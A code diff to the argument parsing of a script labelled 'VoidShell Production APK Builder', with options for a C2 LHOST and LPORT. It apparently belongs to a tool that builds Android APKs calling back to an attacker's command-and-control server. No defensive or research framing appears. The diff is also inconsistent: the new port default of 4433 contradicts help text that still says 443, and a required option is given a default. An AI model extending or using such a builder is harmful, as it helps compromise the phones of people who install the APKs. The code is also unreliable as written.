@@ -147,8 +147,8 @@ def build_apk(lhost: str, lport: str, output_apk: str):
 
 def main():
     parser = argparse.ArgumentParser(description="VoidShell Production APK Builder")
-    parser.add_argument("--lhost", required=True, help="C2 LHOST (IP or domain)")
-    parser.add_argument("--lport", default="443", help="C2 LPORT (default: 443)")
+    parser.add_argument("--lhost", required=True, default="127.0.0.1",  help="C2 LHOST (IP or domain)")
+    parser.add_argument("--lport", default="4433", help="C2 LPORT (default: 443)")
     parser.add_argument("--output", default=None, help="Output APK path")
     args = parser.parse_args()
 
